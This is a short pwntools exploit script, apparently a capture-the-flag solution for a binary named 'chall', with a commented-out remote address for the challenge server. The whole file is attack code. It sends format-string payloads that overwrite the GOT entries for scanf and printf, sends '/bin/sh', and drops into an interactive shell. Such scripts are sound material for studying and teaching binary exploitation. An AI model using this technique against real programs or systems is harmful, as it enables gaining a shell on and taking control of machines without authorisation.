from pwn import *

elf = ELF("./chall")
p = elf.process()
#p = remote("103.245.250.31", 32183)
raw_input("DEBUG")

context.arch = "amd64"
#create loop (overwrite got_scanf to main func)
payload =  b"%005231c"
payload += b"%0012$hn"
payload += p64(elf.got['__isoc99_scanf'])

p.sendlineafter(b"First, tell me your name?", payload)

payload =  b"%4198512x"
payload += b"%012$ln"
payload += p64(elf.got['printf'])


p.sendlineafter(b"First, tell me your name?", payload)

p.sendline(b"/bin/sh")

p.interactive()
